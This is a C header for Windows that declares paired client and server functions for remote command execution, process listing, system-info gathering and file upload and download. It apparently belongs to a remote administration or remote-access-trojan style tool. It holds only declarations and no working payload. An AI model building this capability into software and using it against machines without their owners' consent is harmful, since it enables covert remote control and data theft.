#pragma once
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include "queue.h"
#include "info.h"
#include "networking.h"
#include <WinSock2.h>
#include <TlHelp32.h>

struct ProcessInformation
{
	DWORD pid;
	wchar_t filePath[MAX_PATH];
};

struct UploadDownloadRequest
{
	BOOL upload; // true for upload, false for download
	char path[MAX_PATH];
	size_t filesize;
};

BOOL ClientCommandGetInfo(struct Connection* conn);
BOOL ServerCommandGetInfo(struct Connection* conn);
BOOL ServerCommandExecuteCommand(struct Connection* conn);
BOOL ClientCommandExecuteCommand(struct Connection* conn);
BOOL ServerCommandListProcesses(struct Connection* conn);
BOOL ClientCommandListProcesses(struct Connection* conn);
BOOL ServerCommandUploadFile(struct Connection* conn, char* from, char* to);
BOOL ClientCommandUploadFile(struct Connection* conn, struct MainHeader* request);
BOOL ServerCommandDownloadFile(struct Connection* conn, char* from, char* to);
BOOL ClientCommandDownloadFile(struct Connection* conn, struct MainHeader* request);